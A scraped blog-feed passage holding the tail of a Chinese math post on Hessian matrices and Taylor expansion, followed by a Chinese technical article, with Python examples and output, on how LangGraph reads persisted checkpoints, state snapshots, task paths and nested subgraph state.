&amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right)\n\\end{matrix}\\right]\\\\\n&amp;=\\left[\\begin{matrix}\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1^2}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_2}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_n}}\\\\\n\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_2}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2^2}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2x_n}}\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots\\\\\n\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_n}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2x_n}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_n^2}}\n\\end{matrix}\\right]\\\\\n&amp;=\\nabla^2{f(\\mathbf{X})}\n\\end{aligned}\n\\tag{20}\n\\]</div><p></p><p>即：</p>\n<p></p><div class=\"math display\">\\[\\nabla_{n\\times{n}}\\nabla{f(\\mathbf{X})}=\\nabla^2f(\\mathbf{X}) \\tag{21}\n\\]</div><p></p><p>据此，从上式的得知，函数梯度的Jacobi的矩阵为此函数<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 的Hessian矩阵。</p>\n<p>下面给出常用Jacobi矩阵的几个公式和推论：</p>\n<ol>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{c}_{n\\times1}}=\\mathbf{0}_{n\\times{n}}\\)</span> ，其中<span class=\"math inline\">\\(\\mathbf{c}\\)</span> 是分量全部为常量的<span class=\"math inline\">\\(n\\)</span>维向量，<span class=\"math inline\">\\(\\mathbf{0}\\)</span> 是<span class=\"math inline\">\\(n\\times{n}\\)</span> 阶零向量；</li>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{X}}=\\mathbf{I}\\)</span>，其中<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 是<span class=\"math inline\">\\(n\\)</span>维向量，<span class=\"math inline\">\\(I\\)</span> 为<span class=\"math inline\">\\(n\\times{n}\\)</span> 阶单位矩阵；</li>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{AX}}=\\mathbf{A}^T\\)</span>，其中<span class=\"math inline\">\\(\\mathbf{A}\\)</span>是<span class=\"math inline\">\\(m\\times{n}\\)</span>阶矩阵；</li>\n<li>设 <span class=\"math inline\">\\(\\phi{(t)}=f(\\mathbf{X}_0+t\\mathbf{P})\\)</span>，其中<span class=\"math inline\">\\(f:\\mathbf{R}^n\\rightarrow\\mathbf{R}^{1}\\)</span>, <span class=\"math inline\">\\(\\phi:\\mathbf{R}\\rightarrow\\mathbf{R}\\)</span>，则<span class=\"math inline\">\\(\\phi^{\\prime}(t)=\\nabla f(\\mathbf{X}_0+t\\mathbf{P})^T\\mathbf{P}\\)</span>, <span class=\"math inline\">\\(\\phi^{\\prime\\prime}=\\mathbf{P}^T\\nabla^2{f(\\mathbf{X}_0+t\\mathbf{P})}\\mathbf{P}\\)</span></li>\n</ol>\n<h2 id=\"2多元函数的taylor展开\">2.多元函数的Taylor展开</h2>\n<p>​\t多元函数的Taylor展开式在最优化方法中是十分重要的，许多方法及其收敛方法的证明是从其出发，这里给出Taylor展开定理及其证明。Taylor展开近似可以有效地将复杂函数化为二次函数。</p>\n<p>​\t<strong>定 理 4.2.1</strong> 设<span class=\"math inline\">\\(f:\\mathbf{R}^{n}\\rightarrow\\mathbf{R}\\)</span> 具有二阶连续偏导数，则</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^T\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\overline{\\mathbf{X}})\\mathbf{P} \\tag{22}\n\\]</div><p></p><p>其中：<span class=\"math inline\">\\(\\overline{\\mathbf{X}}=\\mathbf{X}+\\theta\\mathbf{P}(\\theta\\in{(0,1)})\\)</span>。</p>\n<p><strong>证  明</strong>：设 <span class=\"math inline\">\\(\\psi(t)=f(\\mathbf{X}+t\\mathbf{P})\\)</span> 其中 <span class=\"math inline\">\\(t\\in[0,1]\\)</span>:</p>\n<p></p><div class=\"math display\">\\[\\psi(0)=f(\\mathbf{X}) ， \\psi(1)=f(\\mathbf{X}+\\mathbf{P}) \\tag{23}\n\\]</div><p></p><p>对<span class=\"math inline\">\\(\\psi(t)\\)</span> 按照一元函数在<span class=\"math inline\">\\(t=0\\)</span>点展开，得到下式：</p>\n<p></p><div class=\"math display\">\\[   \\psi(t)=\\psi(0)+\\psi^{\\prime}(0)t+\\frac{1}{2}\\psi^{\\prime\\prime}(\\theta t)t^2 \\tag{24}\n\\]</div><p></p><p>其中 <span class=\"math inline\">\\(\\theta\\in(0,1)\\)</span>。令<span class=\"math inline\">\\(t=1\\)</span>，于是</p>\n<p></p><div class=\"math display\">\\[\\psi(1)=\\psi(0)+\\psi^{\\prime}(0)+\\frac{1}{2}\\psi^{\\prime\\prime}(\\theta) \\tag{25}\n\\]</div><p></p><p>又因为上节中 <span class=\"math inline\">\\(\\psi^{\\prime}(\\theta)=\\nabla{f(\\mathbf{X})}^T\\mathbf{P},\\psi^{\\prime\\prime}(\\theta)=\\mathbf{P}^T\\nabla^2f(\\mathbf{X}+\\theta{\\mathbf{P}})\\mathbf{P}\\)</span> ，代入式（25）中得到：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^T\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\mathbf{X}+\\theta\\mathbf{P})\\mathbf{P} \\tag{26}\n\\]</div><p></p><p>式（26）还可以写成：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^{T}\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\mathbf{X})\\mathbf{P}+o(||\\mathbf{P}||^2) \\tag{27}\n\\]</div><p></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 09:48</span>&nbsp;\n<a href=\"https://www.cnblogs.com/GeophysicsWorker\">GeoFXR</a>&nbsp;\n阅读(<span id=\"post_view_count\">42</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "[拆解LangChain执行引擎]持久化状态的提取",
      "link": "https://www.cnblogs.com/jaydenai/p/19623976/read-state",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jaydenai/p/19623976/read-state\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 07:58\">\n    <span>[拆解LangChain执行引擎]持久化状态的提取</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        前面以`写入`的角度介绍了BaseCheckpointSaver的`put/aput`和`put_writes/aput_writes`方法,它们分别实现了基于Checkpoint和Pending Write的持久化。对于一个已经完成的Superstep来说，对应 Checkpoint就代表了它的状态；但是对于一个因中断尚未完成的Superstep，某个时刻的状态由上一Superstep的Checkpoint和当前Superstep的所有Pending Write来描述。如果真的需要恢复到中断时的状态，需要在Checkpoint固化状态基础上按序重放所有的Pending Write（实际上只需要重放代表成功执行任务的Pending Write）就可以了。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>前面以<code>写入</code>的角度介绍了BaseCheckpointSaver的<code>put/aput</code>和<code>put_writes/aput_writes</code>方法,它们分别实现了基于Checkpoint和Pending Write的持久化。对于一个已经完成的Superstep来说，对应 Checkpoint就代表了它的状态；但是对于一个因中断尚未完成的Superstep，某个时刻的状态由上一Superstep的Checkpoint和当前Superstep的所有Pending Write来描述。如果真的需要恢复到中断时的状态，需要在Checkpoint固化状态基础上按序重放所有的Pending Write（实际上只需要重放代表成功执行任务的Pending Write）就可以了。</p>\n<h2 id=\"1-读取checkpoint和pinding-write\">1. 读取Checkpoint和Pinding Write</h2>\n<p>如下这个<code>CheckpointTuple</code>用来表示Checkpoint和Pending Write的结合体。除了这两个核心成员，它还包括当前的执行配置（config和parent_config）和元数据。具体的Pending Write由Task ID、Channel名称和写入数组组成的三元组PendingWrite表示。</p>\n<pre><code class=\"language-python\">class CheckpointTuple(NamedTuple):\n    config: RunnableConfig\n    checkpoint: Checkpoint\n    metadata: CheckpointMetadata\n    parent_config: RunnableConfig | None = None\n    pending_writes: list[PendingWrite] | None = None\nPendingWrite = tuple[str, str, Any]\n</code></pre>\n<p>BaseCheckpointSaver提供了用于读取CheckpointTuple的<code>get_tuple/aget_tuple</code>方法。作为参数的RunnableConfig对象需要提供Thread ID（必需）和Checkpoint 命名空间（可选）。如果没有提供Checkpoint ID，方法会返回最终的状态，如果尚未完成，得到的CheckpointTuple元组可能包含Pending Write。如果提供了Checkpoint ID, 只有在此ID对应最新的Checkpoint且后一Superstep尚未完成，返回的CheckpointTuple元组才有可能包含Pending Write。对于实现在BaseCheckpointSaver中的另一组方法<code>get/aget</code>，会在内部调用<code>get_tuple/aget_tuple</code>方法，并返回CheckpointTuple元组封装的Checkpoint对象。</p>\n<pre><code class=\"language-python\">class BaseCheckpointSaver(Generic[V]):    \n    def get(self, config: RunnableConfig) -&gt; Checkpoint | None\n    async def aget(self, config: RunnableConfig) -&gt; Checkpoint | None\n\n    def get_tuple(self, config: RunnableConfig) -&gt; CheckpointTuple | None\n    async def aget_tuple(self, config: RunnableConfig) -&gt; CheckpointTuple | None\n\n    def list(\n        self,\n        config: RunnableConfig | None,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; Iterator[CheckpointTuple]:\n    async def alist(\n        self,\n        config: RunnableConfig | None,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; AsyncIterator[CheckpointTuple]\n</code></pre>\n<p>对于InMemorySaver来说，它的get_tuple/aget_tuple方法会从RunnableConfig配置中提取Thread ID和Checkpoint命名空间，如果指定了Checkpoint ID，它们会利用这三个值从storage和blobs字典中提取相应数据组成返回的CheckpointTuple对象。如果没有指定Checkpoint ID，就选择最近的那一个Checkpoint的ID。</p>\n<p>BaseCheckpointSaver的alist方法会列出并检索与指定条件匹配的所有CheckpointTuple，这些元组构成了一段 “历史” 。该方法主要用于会话管理、审计历史轨迹以及状态回溯，它具有如下的参数：</p>\n<ul>\n<li>config：如果RunnableConfig如果提供了Thread ID，该方法将仅返回该特定线程下的Checkpoint。如果不提供，在某些实现中会列出所有线程的最新Checkpoint（取决于具体的实现逻辑）。</li>\n<li>filter：提供基于元数据的过滤功能，例如 {\"status\": \"completed”} ，这在需要筛选特定业务状态的Checkpoint时非常有用。</li>\n<li>before：以RunnableConfig对象的形式提供Checkpoint ID，返回在此 之前创建的记录。这对于实现 “时间旅行” 功能至关重要，允许你查看图执行历史中的旧版本。</li>\n<li>limit：用于限制返回数据的数量。</li>\n</ul>\n<p>我们通过如下的实例演示来进一步了解持久化。我们构建了一个由foo、bar1和bar2这三个Node组成的Pregel，启动的时候利用输入针对通道foo的写入驱动执行节点foo，后者完成后写入通道bar驱动节点bar1和bar2并行执行。三个Node的处理函数都是handle，它会将传入的Node名称写入一个BinaryOperatorAggregate类型Channel（nodes），由此确定成功执行的Node。如果调用handle函数将interrupt参数指定为True，它会通过抛出一个GraphInterrupt异常模拟一个中断。在我们的演示实例中，节点foo和bar2会执行成功，中断会发生在节点bar1上。</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue, BinaryOperatorAggregate\nfrom langgraph.checkpoint.memory import InMemorySaver\nfrom langgraph.errors import GraphInterrupt\nimport operator, json\n\ndef handle(node_name: str, interrupt: bool = False) -&gt; list[str]:\n    if interrupt:\n        raise GraphInterrupt(\"manual interrupt\")\n    return [node_name]\n\nfoo = (\n    NodeBuilder()\n    .subscribe_to(\"foo\")\n    .do(lambda _: handle(\"foo\"))\n    .write_to(nodes=lambda x: x, bar=lambda _: \"triggered by foo\")\n)\n\nbar1 = (\n    NodeBuilder()\n    .subscribe_to(\"bar\")\n    .do(lambda _: handle(\"bar1\", interrupt=True))\n    .write_to(\"nodes\")\n)\n\nbar2 = (\n    NodeBuilder()\n    .subscribe_to(\"bar\")\n    .do(lambda _: handle(\"bar2\", interrupt=False))\n    .write_to(\"nodes\")\n)\n\napp = Pregel(\n    nodes={\"foo\": foo, \"bar1\": bar1, \"bar2\": bar2},\n    channels={\n        \"foo\": LastValue(str),\n        \"bar\": LastValue(str),\n        \"nodes\": BinaryOperatorAggregate(list, operator.add),\n    },\n    checkpointer=InMemorySaver(),\n    input_channels=[\"foo\"],\n    output_channels=[\"nodes\"],\n)\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\nresult = app.invoke({\"foo\": \"triggered by user\"}, config=config)\nassert result[\"nodes\"] == [\"foo\", \"bar2\"]\n\n(config, checkpoint, metadata, parent_config, pending_writes) = (\n    app.checkpointer.get_tuple(config)\n)\nprint(f\"config:\\n{json.dumps(config, indent=4)}\")\nprint(f\"checkpoint:\\n{json.dumps(checkpoint, indent=4)}\")\nprint(f\"metadata:\\n{json.dumps(metadata, indent=4)}\")\nprint(f\"parent_config:\\n{json.dumps(parent_config, indent=4)}\")\nprint(f\"pending_writes:\\n{json.dumps(pending_writes, indent=4)}\")\n</code></pre>\n<p>我们为创建的Pregel对象提供了一个InMemorySaver作为它的Checkpointer，并在调用时利用提供的RunnableConfig设置了Thread ID。由于我们将通道nodes作为输出，所以调用结果会反映三个Node的执行状态（只有节点foo和bar2成功执行）。我们随后传入相同的配置调用Checkpointer的get_tuple方法，并将得到的CheckpointTuple元组进行拆包输出。</p>\n<pre><code class=\"language-json\">config:\n{\n    \"configurable\": {\n        \"thread_id\": \"123\",\n        \"checkpoint_ns\": \"\",\n        \"checkpoint_id\": \"1f0f5200-24f1-6382-8000-bde4e02ab92b\"\n    }\n}\ncheckpoint:\n{\n    \"v\": 4,\n    \"ts\": \"2026-01-19T10:17:07.498064+00:00\",\n    \"id\": \"1f0f5200-24f1-6382-8000-bde4e02ab92b\",\n    \"channel_versions\": {\n        \"foo\": \"00000000000000000000000000000001.0.06769883673554666\",\n        \"nodes\": \"00000000000000000000000000000002.0.3174924500871408\",\n        \"bar\": \"00000000000000000000000000000002.0.3174924500871408\"\n    },\n    \"versions_seen\": {\n        \"__input__\": {},\n        \"foo\": {\n            \"foo\": \"00000000000000000000000000000001.0.06769883673554666\"\n        }\n    },\n    \"updated_channels\": [\n        \"bar\",\n        \"nodes\"\n    ],\n    \"channel_values\": {\n        \"foo\": \"triggered by user\",\n        \"nodes\": [\n            \"foo\"\n        ],\n        \"bar\": \"triggered by foo\"\n    }\n}\nmetadata:\n{\n    \"source\": \"loop\",\n    \"step\": 0,\n    \"parents\": {}\n}\nparent_config:\n{\n    \"configurable\": {\n        \"thread_id\": \"123\",\n        \"checkpoint_ns\": \"\",\n        \"checkpoint_id\": \"1f0f5200-24ee-671f-bfff-2e9f3ca91778\"\n    }\n}\npending_writes:\n[\n    [\n        \"30b17cb1-76f1-3c5a-0d32-33f544fcabdf\",\n        \"nodes\",\n        [\n            \"bar2\"\n        ]\n    ],\n    [\n        \"e126d089-c354-0ac8-bb9e-b12bbe3f20b8\",\n        \"__interrupt__\",\n        \"manual interrupt\"\n    ]\n]\n</code></pre>\n<p>整个执行过程涉及三个Superstep，会创建两个Checkpoint。第一个Checkpoint的创建发生在调用invoke方法的时候，此时提供的输入被写入Channel，首批待执行的Node（foo）准备就绪，此时创建的Checkpoint 记录了 <code>接收到了初始任务，但尚未开始执行任何Node</code> 的状态。此时对应的Superstep序号为-1，输出结果的parent_config部分提供了此Checkpoint的ID。</p>\n<p>第二个Checkpoint是为序号为0的Superstep创建的，此时节点foo成功执行，执行结果最终被输入目标Channel，创建的Checkpoint反映的就是的状态，config部分提供了此Checkpoint的ID。上面的输出还提供了这个Checkpoint的时间戳、Channel的版本和值、涉及Node的可见Channel（f和版本，以及涉及更新的Channel列表。</p>\n<p>由于最后一个Superstep（序号为1）没有完全结束，它们会利用对应的Pending Write来描述。上面输出的第一个Pending Write表示成功执行的节点bar针对通道nodes的写入，第二个针对特殊系统Channel <code>__interrupt__</code>的写入很明显就是因为节点bar1的中断导致。</p>\n<h2 id=\"2-读取状态快照\">2. 读取状态快照</h2>\n<p>BaseCheckpointSaver提供了get_tuple/aget_tuple方法以Checkpoint_Tuple的形式返回最新或者基于过去时间点的状态。对于CheckpointTuple这个五元组，除了Checkpoint和PendingWrite列表，还包括Checkpoint的元数据和相关配置。这个元组主要由执行引擎内部使用的，针对最终开发者来说可读性差点，所以Pregel类定义了如下所示的<code>get_state/aget_state</code>方法，它们提供的StateSnapshot类型更具可读性。</p>\n<pre><code class=\"language-python\">class Pregel(\n    PregelProtocol[StateT, ContextT, InputT, OutputT],\n    Generic[StateT, ContextT, InputT, OutputT]): \n\n    def get_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot\n    async def aget_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot\n\n    def get_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; Iterator[StateSnapshot]\n    async def aget_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; AsyncIterator[StateSnapshot]\n</code></pre>\n<p>当我们调用Pregel对象的<code>get_state/aget_state</code>方法的时候，它会将指定的RunnableConfig对象作为参数调用Checkpointer的<code>get_tuple/aget_tuple</code>方法，并利用返回的Checkpoint_Tuple元组生成StateSnapshot对象。StateSnapshot的<code>values</code>字段提供的值来源于Checkpoint对象的channel_values字段，它的<code>metadata</code>字段表示的CheckpointMetadata 直接来源于Checkpoint_Tuple的同名字段，而<code>config</code>和<code>parent_config</code>返回的RunnableConfig则是由Checkpoint_Tuple同名字段于元数据合并而成。表示快照创建时间的<code>created_at</code>对应于Checkpoint_Tuple表示时间戳的ts字段，而interrupts返回的Interrupt列表是根据中断类型的PendingWrite构建的。</p>\n<pre><code class=\"language-python\">class StateSnapshot(NamedTuple):\n    values: dict[str, Any] | Any\n    next: tuple[str, ...]\n    config: RunnableConfig\n    metadata: CheckpointMetadata | None\n    created_at: str | None\n    parent_config: RunnableConfig | None\n    tasks: tuple[PregelTask, ...]\n    interrupts: tuple[Interrupt, ...]\n\nclass PregelTask(NamedTuple):\n    id: str\n    name: str\n    path: tuple[str | int | tuple, ...]\n    error: Exception | None = None\n    interrupts: tuple[Interrupt, ...] = ()\n    state: None | RunnableConfig | StateSnapshot = None\n    result: Any | None = None\n</code></pre>\n<p>StateSnapshot的<code>tasks</code>字段返回一组PregelTask对象，它们表示根据Checkpoint创建的待执行任务，<code>next</code>字段以元组的形式返回这些任务的Node名称。对于最新的Checkpoint，若下一个Superstep尚未完成，PregelTask的信息还会利用对应的Pending Write进一步完善。我们可以利用PregelTask对象得到每个任务的ID、Node名称、执行路径、抛出的异常和中断（根据异常和中断类型的PendingWrite创建），而<code>state</code>和<code>result</code>分别承载这任务的状态和输出结果。如果整个执行流程结束，自然就没有所谓后续任务的说法，此时StateSnapshot的tasks字段为空。</p>\n<p>除了返回一个具体的状态快照，Pregel类还定义了<code>get_state_history/aget_state_history</code>，它们的参数列表与BaseCheckpointSaver的<code>list/alist</code>方法完全一致。当这两个方法被调用的时候，Pregel会调用Checkpointer的<code>list/alist</code>方法，并将得到Checkpoint_Tuple元组转换成StateSnapshot对象。<code>get_state_history/aget_state_history</code>方法返回的迭代器以时间逆序的方式返回对应的状态快照。</p>\n<p>如下这个程序演示了一个具体的Pregel对象的历史由哪些快照组成，每个快照又反映当时的状态。我们构建的Pregel对象由四个Node组成，调用时指定通道foo会驱动执行节点foo，它执行结束后写入通道bar驱动bar1、bar2和bar3并行执行。除了bar1能够顺利执行外，我们为bar2设置了一个中断，让bar3抛出异常。</p>\n<pre><code class=\"language-python\">from langgraph.channels import LastValue\nfrom langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.checkpoint.memory import  InMemorySaver\nfrom langgraph.types import interrupt\n    \ndef handle(node_name: str, halt : bool, raise_error: bool) -&gt; None:\n    if halt:\n        _ = interrupt(f\"Manually be interrupted at {node_name}\")\n    if raise_error:\n        raise Exception(f\"Manually raised error at {node_name}\")\n\nfoo = (NodeBuilder()\n       .subscribe_to(\"foo\", read=False)\n       .do(lambda _: handle(\"foo\", halt=False, raise_error=False))\n       .write_to(bar = lambda _:None))\nbar1 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar1\", halt=False, raise_error=False)))\nbar2 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar2\", halt=True, raise_error=False)))\nbar3 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar3\", halt=False, raise_error=True)))\napp = Pregel(\n    nodes={\n        \"foo\": foo,\n        \"bar1\": bar1,\n        \"bar2\": bar2,\n        \"bar3\": bar3\n    },\n    channels={\n        \"foo\": LastValue(str),\n        \"bar\": LastValue(str),\n    },\n    input_channels=[\"foo\"],\n    output_channels=[],\n    checkpointer= InMemorySaver())\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\n\ntry:\n    app.invoke(input={\"foo\": \"begin\"},config=config)\nexcept Exception as e:\n    pass\n\nfor snapshot in app.get_state_history(config):\n    print(f\"\"\"\nvalues: {snapshot.values}\nnext: {snapshot.next}\ninterrupts: {snapshot.interrupts}   \ntasks:\"\"\")\n    for task in snapshot.tasks:\n        print(f\"\"\"  id: {task.id}\n    name: {task.name}\n    path: {task.path}\n    error: {task.error} \n    interrupts: {task.interrupts}\n    state: {task.state}\n    result: {task.result}\"\"\")\n</code></pre>\n<p>在完成了针对Pregel对象的调用后，我们采用相同的配置调用它的<code>get_state_history</code>方法得到完整的历史，并将承载历史片段的StateSnapshot信息打印出来。整个过程涉及三个Superstep，前两个成功完成的Superstep会提供两个Checkpoint，第三个尚未完成的Superstep只提供针对三个Node任务的Pending Write。</p>\n<pre><code class=\"language-json\">values: {'start': 'begin', 'bar': None}\nnext: ('bar1', 'bar2', 'bar3')\ninterrupts: (Interrupt(value='Manually be interrupted at bar2', \n    id='26f309d618c42ff31d2b3404369232e4'),)\ntasks:\n  id: dbb24ec5-f1ba-f845-7351-54e88f34db0f\n    name: bar1\n    path: ('__pregel_pull', 'bar1')\n    error: None\n    interrupts: ()\n    state: None\n    result: {}\n  id: 794fffda-2e6c-0685-0d44-3ed6c57ca366\n    name: bar2\n    path: ('__pregel_pull', 'bar2')\n    error: None\n    interrupts: (Interrupt(value='Manually be interrupted at bar2', \n        id='26f309d618c42ff31d2b3404369232e4'),)\n    state: None\n    result: None\n  id: 1055ec55-49dc-0629-86b5-661a2614f349\n    name: bar3\n    path: ('__pregel_pull', 'bar3')\n    error: Exception('Manually raised error at bar3')\n    interrupts: ()\n    state: None\n    result: None\n\nvalues: {'start': 'begin'}\nnext: ('foo',)\ninterrupts: ()\ntasks:\n  id: 88904475-3edc-733a-d84d-98aa6d3f5e80\n    name: foo\n    path: ('__pregel_pull', 'foo')\n    error: None\n    interrupts: ()\n    state: None\n    result: {'bar': None}\n</code></pre>\n<h2 id=\"3任务路径\">3.任务路径</h2>\n<p>还记得我们前面说个任务的两种创建方式，一种是站在Node的角度，通过查看订阅Channel的更新状态确定是否应该执行，我们称这种任务创建模式为<code>Pull模式</code>。与之相对的则是<code>Push模式</code>，Node利用写入<code>__pregel_tasks</code>这个特殊Channel的Send对象决定后续执行的Node，执行引擎会从此Channel读取Send对象的来创建对应的任务。任务路径的第一部分通常就反映了任务的驱动模式，对应的值为<code>__pregel_pull</code>和<code>__pregel_push</code>。</p>\n<p>由于前面演示的都是基于Channel订阅驱动的任务，所以路径采用(“__pregel_pull”,{node})的形式。如下的程序演示“Push任务”的路径，我们构建的Pregel由四个Node（foo、bar1、bar2和bar3）组成，节点foo的处理函数最终会生成三个针对其他Node的Send对象，并写入“__pregel_tasks”Channel以驱动它们并行执行。</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue\nfrom langgraph.pregel._read import PregelNode\nfrom langgraph.pregel._write import ChannelWrite, ChannelWriteTupleEntry\nfrom langgraph.types import Send\nfrom langgraph.checkpoint.memory import InMemorySaver\n\nentry = ChannelWriteTupleEntry(lambda args: [(\"__pregel_tasks\", args)])\nwriter = ChannelWrite(writes=[entry])\nfoo: PregelNode = (\n    NodeBuilder()\n    .subscribe_to(\"foo\")\n    .do(lambda _: [Send(node=node, arg=\"foo\") for node in [\"bar1\", \"bar2\", \"bar3\"]])\n).build()\nfoo.writers.append(writer)\n\nbars = {name: NodeBuilder() for name in [\"bar1\", \"bar2\", \"bar3\"]}\n\napp = Pregel(\n    nodes={\"foo\": foo, **bars},\n    channels={\n        \"foo\": LastValue(None),\n    },\n    input_channels=[\"foo\"],\n    output_channels=[],\n    checkpointer=InMemorySaver(),\n)\n\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\nresult = app.invoke(input={\"foo\": None}, config=config, interrupt_before=\"bar2\")\nsnapshot = app.get_state(config)\nfor task in snapshot.tasks:\n    print(f\"{task.name}:{task.path}\")\n</code></pre>\n<p>为了能看到三个任务，我们在在最后一个Superstep中产生一个中断，为此我们在调用的时候通过指定<code>interrupt_before</code>参数在执行节点bar2前中断。我们随后调用Pregel的get_state方法得到描述最终状态的StateSnapshot，并输出所有任务的执行路径。从如下的输出可以看出，由于是三个基于Push模式的任务，所以组成路径的第一个部分内容为 <code>__pregel_push</code> 。每个任务由 <code>__pregel_tasks</code> Channel的Send对象构建而成，第二部分的数组代表对应的Send对象在Channel中的索引。由于整个程序只有唯一的Pregel对象，不设置子图调用，所以第三部分返回False。</p>\n<pre><code>bar1:('__pregel_push', 0, False)\nbar2:('__pregel_push', 1, False)\nbar3:('__pregel_push', 2, False)\n</code></pre>\n<h2 id=\"4状态嵌套\">4.状态嵌套</h2>\n<p>这里我们有必要提一下PregelTask类的<code>state</code>字段。从给出的定义可以看出，它可以返回一个RunnableConfig配置，也可以返回一个StateSnapshot对象。如果任务涉及子图的调用，并且在调用get_state/aget_state方法时将subgraphs参数设置为True，它的state字段就会返回一个描述子图当前状态的<code>StateSnapshot</code>对象。借助于反映执行链路和调用顺序的Checkpoint命名空间，就可以形成的嵌套层次结构（state =&gt;task=&gt;state）使我们可以可以看到一个任务完整的调用链条。</p>\n<p><img alt=\"Alternative Text\" class=\"lazyload\" /></p>\n<p>以如下这个验证程序为例。我们构建了两个具有单一Node的Pregel对象app和sub_graph，前者的节点main_node以子图调用的方式调用sub_graph，后者的Node命名为 “sub_node”。为了在StateSnapshot中将任务保留下来，我们在两个Node中引入了中断。</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue\nfrom langgraph.checkpoint.memory import InMemorySaver\nfrom langgraph.types import interrupt\nfrom typing import Any\nfrom langgraph.types import StateSnapshot\n\nsub_node = (NodeBuilder()\n    .subscribe_to(\"start\")\n    .do(lambda _: interrupt(\"manual interrupt\"))\n)\nsub_graph = Pregel(\n    nodes={\"sub_node\": sub_node},\n    channels={\"start\": LastValue(str)},\n    input_channels=[\"start\"],\n    output_channels=[],\n)\n\ndef handle(args: dict[str, Any]) -&gt; None:\n    sub_graph.invoke(input={\"start\": \"begin\"})\n    interrupt(\"main graph interrupt\")\n\nmain_node = NodeBuilder().subscribe_to(\"start\").do(handle)\napp = Pregel(\n    nodes={\"main_node\": main_node},\n    channels={\"start\": LastValue(str)},\n    input_channels=[\"start\"],\n    output_channels=[],\n    checkpointer=InMemorySaver())\n\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\napp.invoke(input={\"start\": \"begin\"}, config=config)\nsnapshot = app.get_state(config, subgraphs=True)\n\nindent = -1\ndef print_snapshot(snapshot: StateSnapshot) -&gt; None:\n    global indent\n    indent += 1\n    config = snapshot.config[\"configurable\"]\n    print(f\"{'  ' * indent}checkpoint_ns: {config.get('checkpoint_ns', None)}\")\n    for task in snapshot.tasks:\n        print(f\"{'  ' * indent}task: {task.name}:{task.id}\")\n        if sub_snapshot := task.state:\n            print_snapshot(sub_snapshot)\n\nprint_snapshot(snapshot)\n</code></pre>\n<p>在完成调用后，我们调用作为主图的Pregel对象的<code>get_state</code>方法，并将参数subgraphs设置为True。我们调用print_snapshot函数输出StateSnapshot提供的Checkpoint命名空间和任务的名称与ID。如果描述任务的PregelTask对象的state字段也是一个StateSnapshot对象，那么继续递归调用此函数。从如下的输出可以看出，作为子图的Pregel将当前任务的名称和ID的组合作为Checkpoint命名空间，这样的结构确保了 “主图” 恢复的时候能够精准地加载 “子图” 